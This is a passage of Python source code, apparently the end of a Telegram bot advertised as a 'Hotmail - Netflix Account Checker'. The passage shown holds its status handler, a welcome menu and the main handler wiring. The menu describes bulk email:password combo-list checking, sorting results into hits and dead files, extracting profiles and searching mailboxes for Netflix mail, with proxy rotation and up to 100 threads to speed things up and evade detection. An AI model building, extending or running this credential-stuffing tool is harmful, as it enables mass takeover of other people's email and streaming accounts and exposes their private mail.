        if proxy_count > 0:
            max_speed = min(proxy_count * thread_count, 100)
            status_text += f"🚀 <b>Max concurrent speed:</b> {max_speed} simultaneous checks\n"
            status_text += f"💨 <b>Theoretical max:</b> {proxy_count * 100} requests with 100 threads"
        else:
            status_text += "⚠️ <b>No proxies configured</b> - Add proxies for maximum speed\n"
            status_text += f"🔥 <b>Current max:</b> {thread_count} concurrent checks"

        await update.message.reply_text(status_text, parse_mode='HTML')

    except Exception as e:
        await update.message.reply_text(f"❌ Error getting status: {str(e)}", parse_mode='HTML')

@prevent_duplicate
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome_msg = "🔥 <b>Hotmail - Netflix Account Checker - ULTRA SPEED EDITION</b>\n\n"
    welcome_msg += "📋 <b>Commands:</b>\n"
    welcome_msg += "• /check email:password - Check single account\n"
    welcome_msg += "• /combo - Upload .txt file for <b>basic login check</b>\n"
    welcome_msg += "• /nf - Upload .txt file for <b>Netflix analysis</b>\n"
    welcome_msg += "• /proxy ip:port:user:pass - Add proxy\n"
    welcome_msg += "• /threads 100 - Set thread count (1-100)\n"
    welcome_msg += "• /status - Check proxy & thread status\n"
    welcome_msg += "• /clearproxy - Clear all proxies\n\n"
    welcome_msg += "🔄 <b>Basic Login Check (/combo):</b>\n"
    welcome_msg += "• Ultra-fast credential validation\n"
    welcome_msg += "• Returns hits.txt and dead.txt files\n"
    welcome_msg += "• Shows only valid/invalid status\n\n"
    welcome_msg += "🎬 <b>Netflix Analysis (/nf):</b>\n"
    welcome_msg += "• Full profile extraction\n"
    welcome_msg += "• Mail folder analysis\n"
    welcome_msg += "• Netflix email search\n"
    welcome_msg += "• Detailed account information\n\n"
    welcome_msg += "⚡ <b>ULTRA SPEED Features:</b>\n"
    welcome_msg += "• 🚀 <b>Threading:</b> Up to 100 concurrent threads\n"
    welcome_msg += "• 🌐 <b>Proxy Support:</b> Unlimited proxy rotation\n"
    welcome_msg += "• 🔥 <b>Max Speed:</b> 100 × Proxies = Insane Speed\n"
    welcome_msg += "• 💨 <b>Anti-Duplicate:</b> Zero duplicate responses\n"
    welcome_msg += "• 📊 <b>Real-time Progress:</b> Live speed monitoring\n\n"
    welcome_msg += "🎯 <b>Speed Examples:</b>\n"
    welcome_msg += "• 10 proxies × 100 threads = 1,000 concurrent checks\n"
    welcome_msg += "• 50 proxies × 100 threads = 5,000 concurrent checks\n"
    welcome_msg += "• 100 proxies × 100 threads = 10,000 concurrent checks!"

    await update.message.reply_text(welcome_msg, parse_mode='HTML')

def main():
    print("🚀 Starting Hotmail - Netflix Account Checker Bot (ULTRA SPEED EDITION)...")
    print(f"🔑 Using token: {TELEGRAM_TOKEN[:10]}...")
    print("✅ Features: 100 THREADS + PROXIES + ANTI-DUPLICATE + NETFLIX DETECTION")
    print("⚡ MAX SPEED: Up to 100 concurrent checks per user!")
    print("🔥 ULTRA PERFORMANCE: Proxy rotation + Semaphore control")

    # Create application
    application = Application.builder().token(TELEGRAM_TOKEN).build()

    # Add handlers with duplicate prevention
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("check", check_account))
    application.add_handler(CommandHandler("combo", combo_command))
    application.add_handler(CommandHandler("nf", netflix_command))
    application.add_handler(CommandHandler("proxy", set_proxy))
    application.add_handler(CommandHandler("threads", set_threads))
    application.add_handler(CommandHandler("status", proxy_status))
    application.add_handler(CommandHandler("clearproxy", clear_proxies))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))

    # Run the application
    print("✅ Bot is running with ULTRA SPEED (100 threads)...")
    application.run_polling(drop_pending_updates=True)

if __name__ == '__main__':
    main()
